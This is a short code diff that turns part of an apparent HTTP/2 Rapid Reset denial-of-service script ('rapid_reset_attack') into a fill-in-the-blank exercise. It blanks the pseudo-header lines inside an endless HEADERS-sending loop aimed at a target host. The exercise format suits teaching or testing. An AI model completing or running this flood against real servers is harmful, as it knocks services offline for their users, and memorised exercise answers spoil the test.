@@ -30,12 +30,15 @@ def rapid_reset_attack(target_host, target_port):
             request_count = 0
             while True:
                 try: 
-                    # Send HEADERS
+                    # TODO: Send HTTP/2 HEADERS frame
+                    # Include required pseudo-headers: :method, :authority, :path, :scheme
+                    # Use conn.send_headers() with appropriate parameters
+                    
                     conn.send_headers(stream_id, [
-                        (':method', 'GET'),
-                        (':authority', target_host),
-                        (':path', '/'),
-                        (':scheme', 'https'),
+                        ________,
+                        ________,
+                        ________,
+                        ________,
                         ('user-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'),
                     ])
 
